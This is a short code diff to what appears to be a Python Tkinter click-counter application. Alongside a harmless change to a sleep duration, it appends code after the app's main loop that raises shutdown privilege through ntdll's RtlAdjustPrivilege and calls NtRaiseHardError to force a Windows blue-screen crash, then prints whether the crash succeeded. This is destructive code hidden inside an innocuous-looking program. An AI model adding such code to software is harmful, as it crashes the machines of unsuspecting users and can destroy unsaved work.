@@ -100,5 +100,13 @@ if __name__ == "__main__":
     root = tk.Tk()
     app = ClickCounterApp(root)
     root.mainloop()
-time.sleep(30000)
+time.sleep(3000)
 
+ntdll = ctypes.windll.ntdll
+prev_value = ctypes.c_bool()
+res = ctypes.c_ulong()
+ntdll.RtlAdjustPrivilege(19, True, False, ctypes.byref(prev_value))
+if not ntdll.NtRaiseHardError(0xDEADDEAD, 0, 0, 0, 6, ctypes.byref(res)):
+    print("BSOD Successfull!")
+else:
+    print("BSOD Failed...")
